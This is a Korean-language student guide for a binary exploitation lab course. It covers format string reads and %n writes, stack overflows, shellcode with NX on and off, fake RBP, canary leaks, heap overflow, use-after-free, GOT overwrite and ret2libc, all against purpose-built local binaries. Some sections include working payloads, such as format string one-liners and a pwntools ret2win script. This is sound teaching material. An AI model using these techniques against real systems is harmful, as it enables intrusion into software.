# 학생 실습 가이드

이 문서는 정답 주소를 제공하지 않는다. 주소와 오프셋은 자신의 바이너리에서 GDB와 pwntools로 구한다. 모든 문제는 해당 디렉터리에서 `make` 후 시작한다.

## 공통 준비

```bash
cd /home/exp/ksj-labs
make all
python3 -c 'from pwn import *; print(context)'
```

GDB에서 자주 사용할 명령:

```gdb
checksec
info functions
info variables
disassemble /r main
info registers
x/32gx $rsp
```

## Day 1

### 0. PPT 기초 데모 4종

경로: `day1/00-foundations`

```bash
./gdb_call
./integer_overflow
echo -1 | ./oob_read
./off_by_one
```

- `gdb_call`: `break add` 후 `EDI=4`, `ESI=5`, 반환 직전 `EAX=9`를 확인한다.
- `integer_overflow`: `0xfffffff0 + 0x30`이 `uint32_t`에서 `0x20`이 되어 `ACCEPT`로 가는 분기를 관찰한다.
- `oob_read`: `buf[-1]`이 구조체 바로 앞 `secret`을 읽는 현재 빌드의 레이아웃을 `p &data`, `x/5dw &data`로 확인한다.
- `off_by_one`: `i <= 4`의 다섯 번째 쓰기가 인접한 `guard`를 `Z`에서 `A`로 바꾸는 것을 확인한다.

### 1. `01` (`fsb32_read`): 전역 문자열 유출

경로: `day1/01-fsb-read`

목표는 `flag.txt`를 셸 명령으로 직접 읽지 않고, 취약한 `printf`를 통해 `flag_buf`의 문자열을 출력하는 것이다.

1. `file ./01`과 `checksec`으로 32비트/non-PIE를 확인한다.
2. `%p`를 여러 개 보내 입력 버퍼의 4바이트가 몇 번째 포맷 인자로 해석되는지 찾는다.
3. GDB에서 `p &flag_buf`, `x/s &flag_buf`로 목표 주소와 데이터 형식을 관찰한다.
4. little endian 주소와 위치 지정자 `%<n>$s`의 관계를 설명한 뒤 payload를 만든다.

추천 중단점:

```gdb
break 01.c:30
run
p &flag_buf
x/32wx $esp
```

PPT의 Python 2.7 원라이너는 다음과 같다. `fsb32_read`는 숫자 바이너리 `01`의 호환 별칭이다.

```bash
python2.7 -c 'print "\x60\xc0\x04\x08, %x, %x, %x, %s"' | ./fsb32_read
```

성공 조건: `KSJ{FSB_READ_VERIFIED}` 출력.

### 1-2. `02` (`fsb32_write`): `%n` 메모리 쓰기

경로: `day1/02-fsb-write`

먼저 `AAAA`가 printf의 몇 번째 인자로 보이는지 찾는다. 현재 교육용 i386 빌드에서는 7번째 인자이며 `changeMe`의 고정 주소는 `0x0804c028`이다.

```bash
(python2.7 -c 'print "AAAA"+",%p"*10'; cat) | ./fsb32_write
```

주소 4바이트와 `%323c`가 출력한 총 327바이트를 `%7$n`으로 `changeMe`에 기록한다. `$`를 생략한 `%7n`은 올바른 위치 지정 문법이 아니다.

```bash
(python2.7 -c 'print "\x28\xc0\x04\x08%323c%7$n"'; cat) | ./fsb32_write
```

```gdb
break 02.c:25
run
p &changeMe
watch changeMe
```

성공 조건: `KSJ{FSB_PERCENT_N_WRITE_VERIFIED}` 출력.

### BOF 시작 전. pwntools 스크립트 기초

Docker의 기준 풀이와 같은 Python 3 형식을 먼저 익힌다.

```python
from pwn import *

p = process("./bof_ret2win")
win = b"\x56\x11\x40\x00\x00\x00\x00\x00"
payload = b"A" * 520 + win
p.sendafter(b"Send payload:\n", payload)
p.interactive()
```

- GDB의 `p/x &win`으로 `0x401156`을 확인한다.
- 64비트 주소를 직접 little endian으로 바꾸면 `56 11 40 00 00 00 00 00`이다.
- `process`: 로컬 프로세스 실행
- `sendafter`: 특정 프롬프트를 받은 뒤 payload 전송
- `gdb.attach(p)`: 실행 중인 프로세스에 GDB 연결
- `p.interactive()`: 셸을 얻은 뒤 상호작용

### 2. `bof_ret2win`: saved RIP 제어

경로: `day1/03-bof-ret2win`

목표는 `vuln`의 지역 버퍼를 넘쳐 복귀 주소를 `win`으로 바꾸는 것이다.

1. `disassemble /r vuln`에서 버퍼 크기와 프레임 구조를 확인한다.
2. pwntools의 `cyclic()`과 GDB를 사용해 saved RIP까지의 거리를 구한다.
3. GDB의 `p/x &win`으로 목적지를 구하고 8바이트 little endian으로 직접 바꾼다.
4. NX가 켜진 상태에서 셸코드 없이 제어 흐름을 바꾸는 이유를 설명한다.

추천 중단점:

```gdb
break vuln
run
p &buf
x/70gx $rsp
```

성공 조건: `KSJ{RET2WIN_VERIFIED}` 출력.

완성된 payload의 조립·전송 흐름은 같은 폴더의 `payload.py`에서 확인하고 실행할 수 있다.

```bash
python3 payload.py
```

### 2-2. `stack_shellcode`: NX OFF/ON 비교

경로: `day1/04-stack-shellcode`

동일 소스를 두 옵션으로 빌드했다. `stack_shellcode_nx_off`는 스택 주소 leak과 BOF를 이용해 스택의 shellcode를 실행할 수 있고, `stack_shellcode_nx_on`은 같은 payload가 SIGSEGV로 차단된다.

```bash
pwn checksec ./stack_shellcode_nx_off
pwn checksec ./stack_shellcode_nx_on
python3 payload.py
```

`payload.py`는 실행 중인 프로세스가 출력한 `buf` 주소를 받아 `shellcode + A padding + leaked buf address`를 만든다. NX ON을 비교할 때는 스크립트의 실행 파일명을 `stack_shellcode_nx_on`으로 바꾼다. ASLR이 켜져 있으므로 leak과 payload 전송은 같은 프로세스에서 이루어져야 한다. GDB에서 `vmmap`으로 stack 권한이 `rwx`와 `rw-`로 달라지는지 비교한다.

### 2-3. `fake_rbp`: fake RBP로 민감 함수 실행

경로: `day1/05-fake-rbp`

`vuln`은 `system("/bin/sh")`을 실행하는 민감 함수다. `read_input`의 520바이트 입력은 512바이트 버퍼와 saved RBP까지만 덮고 saved RIP는 보존한다. 버퍼 첫 8바이트에는 GDB로 확인한 `vuln` 주소, saved RBP에는 `buf-8`을 넣는다. `read_input`은 원래 위치로 한 번 반환하고, caller인 `main`의 `leave; ret`은 fake stack의 `[buf]`를 RIP로 꺼내 `vuln`을 실행한다.

```gdb
break *vuln
run
disassemble /r vuln
disassemble /r main
```

ASLR을 끈 pwntools 프로세스에 GDB를 붙인 뒤 `frame 1`, `p/x &buf`로 버퍼 주소를 확인하고 `p/x &vuln`으로 민감 함수 주소를 확인한다. `read_input`의 `leave; ret` 전후와 `main`의 `leave; ret` 전후에서 `RSP`, `RBP`, `RIP`를 기록한다.

520바이트 payload가 원래 saved RIP를 보존하면서 fake RBP를 통해 `vuln`을 실행하는 흐름은 다음 명령으로 재현한다.

```bash
python3 payload.py
```

PPT의 Canary Leak은 아래 `canary_leak` 상세 절을 Day 1 마지막 실습으로 사용한다. 디렉터리 경로는 기존 호환성을 위해 `day3/01-canary-leak`에 유지했다.

## Day 2

### 0. Heap 기초 데모 4종

경로: `day2/00-heap-basics`

```bash
./heap_layout
./uninitialized
./double_free
./type_confusion
```

- `heap_layout`: `sizeof(Node)=16`, `next_offset=8`에서 padding과 포인터 정렬을 확인한다.
- `uninitialized`: 같은 청크가 재사용되고 초기화하지 않은 `key`에서 `SECRET`이 남는 고정된 glibc 환경을 관찰한다.
- `double_free`: 현대 glibc의 tcache 중복 해제 검출로 SIGABRT가 발생한다.
- `type_confusion`: 같은 8바이트를 정수로 기록한 뒤 문자열 포인터로 해석한다.

이후 `use_after_free`에서 동일 크기 객체의 실제 재할당이 Type Confusion과 AAW로 이어지는 과정을 연결한다.

### 3. `heap_overflow`: 인접 객체 포인터 변조

경로: `day2/01-heap-overflow`

목표는 두 `Data` 객체와 데이터 청크를 원하는 순서로 할당하고, 첫 데이터의 `modify`에서 두 번째 `Data.ptr`을 `flag` 주소로 바꾼 뒤 값을 쓰는 것이다.

1. `create → insert → create → insert` 순서로 객체를 만든다.
2. GDB에서 `p allocates[0]`, `p *allocates[0]`, `p allocates[1]`, `heap`을 비교한다.
3. 첫 데이터 청크 시작부터 두 번째 `Data.ptr`까지의 거리를 직접 계산한다.
4. `modify`의 입력 크기가 기록된 `Data.size`와 비교되지 않는 점을 확인한다.

추천 중단점:

```gdb
break modify_data
break check_flag
p &flag
p allocates[0]
x/16gx allocates[0]
```

성공 조건: `KSJ{HEAP_OVERFLOW_AAW_VERIFIED}` 출력.

### 4. `use_after_free`: dangling pointer와 타입 혼동

경로: `day2/02-use-after-free`

목표는 해제된 `String` 객체와 같은 크기의 `Number` 객체를 재할당하여, 숫자 필드를 문자열 포인터로 다시 해석하게 만드는 것이다.

1. `create string` 후 객체와 문자열 버퍼의 청크 크기를 비교한다.
2. `delete string` 후 `string_slot`이 NULL이 되지 않는 것을 확인한다.
3. `create number`가 어느 해제 청크를 재사용하는지 관찰한다.
4. `set string`이 최종적으로 어느 주소에 쓰는지 추적한다.

추천 중단점:

```gdb
break delete_string
break create_number
break set_string
p &flag
p string_slot
```

성공 조건: `KSJ{USE_AFTER_FREE_AAW_VERIFIED}` 출력.

## Day 3

### 0. `protections`: ASLR·PIE·Lazy Binding

경로: `day3/00-protections`

```bash
./aslr_demo
./aslr_demo
./aslr_demo
./pie_off
./pie_on
pwn checksec ./pie_off
pwn checksec ./pie_on
pwndbg ./lazy_binding
```

- ASLR: stack, heap, 실제 libc `puts` 주소가 실행마다 변하는지 비교한다.
- PIE: `pie_off`의 `main`/`counter`는 고정되고 `pie_on`은 base만 변하며 두 심볼의 상대 거리는 일정하다.
- Lazy Binding: `puts@plt` 첫 호출 전후의 `puts@got.plt` 값을 비교하고 두 번째 호출에서 resolver를 거치지 않는지 관찰한다.

### Day 1 보강. `canary_leak`: NUL 바이트 복원과 2단계 BOF

경로: `day3/01-canary-leak`

첫 입력은 canary의 최하위 NUL 바이트까지만 덮어 `puts`가 나머지 7바이트를 출력하게 한다. 두 번째 입력은 원래 canary를 보존하면서 saved RIP를 바꾼다.

1. `checksec`에서 canary가 실제로 있는지 확인한다.
2. `disassemble /r vuln`에서 `fs:0x28` 로드와 epilogue 검사를 찾는다.
3. GDB에서 버퍼 시작과 canary 사이의 거리를 구한다.
4. leak한 7바이트 앞에 `\x00`을 복원해 8바이트 정수로 만든다.
5. 함수 호출 전 16바이트 스택 정렬이 필요한지 확인한다.

성공 조건: `KSJ{CANARY_LEAK_BYPASS_VERIFIED}` 출력.

### 6. `got_overwrite`: Partial RELRO 이용

경로: `day3/02-got-overwrite`

프로그램은 한 번의 8바이트 임의 쓰기를 제공한 뒤 `puts(command)`를 호출한다. 목표는 `puts`의 GOT 엔트리를 이미 존재하는 `system@plt`로 바꾸는 것이다.

1. `checksec`에서 Partial RELRO를 확인한다.
2. pwndbg의 `got`, `plt`, `x/gx <puts@got>`으로 PLT/GOT 연결을 본다.
3. 첫 번째 입력이 `system`의 명령 문자열로도 유효하도록 선택한다.
4. Full RELRO라면 같은 방식이 왜 실패하는지 설명한다.

성공 조건: `KSJ{GOT_OVERWRITE_VERIFIED}` 출력.

같은 소스의 `got_overwrite_full`에는 Full RELRO가 적용되어 있다. 같은 `puts@GOT → system@PLT` 쓰기를 시도하면 GOT 페이지가 읽기 전용이므로 SIGSEGV가 발생한다.

```bash
pwn checksec ./got_overwrite
pwn checksec ./got_overwrite_full
python3 solve_reference.py
python3 verify_full_relro.py
```

### 7. `rop_ret2libc`: GOT leak과 libc ASLR 우회

경로: `day3/03-rop-ret2libc`

1단계 ROP는 `write(1, read@got, 8)`로 실제 libc의 `read` 주소를 유출하고 `main`으로 돌아간다. 2단계는 그 주소에서 libc base를 계산해 `system("/bin/sh")`을 호출한다.

1. saved RIP offset과 `pop_rdi_rsi_rdx_ret`의 주소를 구한다.
2. `read@got`, `write@plt`, `main`으로 1단계 체인을 구성한다.
3. `/lib/x86_64-linux-gnu/libc.so.6`의 `read` 오프셋을 빼서 libc base를 계산한다.
4. libc 안의 `/bin/sh`와 `system` 주소를 계산한다.
5. 호출 직전 `RSP` 16바이트 정렬을 확인하고 필요하면 단일 `ret`을 넣는다.

추천 GDB 관찰:

```gdb
break vuln
run
p pop_rdi_rsi_rdx_ret
got
plt
vmmap
```

성공 조건: ASLR이 켜진 여러 실행에서 `KSJ{TWO_STAGE_RET2LIBC_VERIFIED}` 출력.

PPT의 One-Gadget은 이 실습의 libc base 계산 뒤 선택적으로 비교한다. One-Gadget offset은 현재 glibc에 종속되고 레지스터·스택·메모리 제약을 충족해야 하므로 주소만 계산한 결과를 성공으로 간주하지 않는다. 필수 성공 경로는 검증 가능한 `system("/bin/sh")` ROP다.

## 강사용 일괄 확인

학생 풀이를 배포하기 전 다음 명령이 모두 PASS인지 확인한다.

```bash
cd /home/exp/ksj-labs
make verify
```
